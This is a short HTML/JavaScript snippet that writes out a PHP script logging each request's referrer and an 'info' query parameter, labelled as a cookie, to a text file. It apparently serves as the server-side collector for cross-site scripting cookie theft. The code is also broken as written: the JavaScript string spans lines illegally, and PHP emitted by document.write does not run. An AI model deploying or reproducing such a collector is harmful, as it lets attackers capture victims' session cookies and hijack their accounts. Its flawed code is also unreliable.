<script language="JavaScript">

var nl = getNewLine()

function getNewLine() {
	var agent = navigator.userAgent

	if (agent.indexOf("Win") >= 0)
		return "\r\n"
	else
		if (agent.indexOf("Mac") >= 0)
			return "\r"

 	return "\r"

}

pagecode = '<?php
$f = fopen("logs.txt","a");
$referrer = "\\n".$_SERVER[\'HTTP_REFERER\']."\\n";
$cookie = "info=".$_GET[\'info\']."\\n";
fwrite($f, $referrer);
fwrite($f, $cookie);
fclose($f);
?>'

document.write(pagecode);

</script>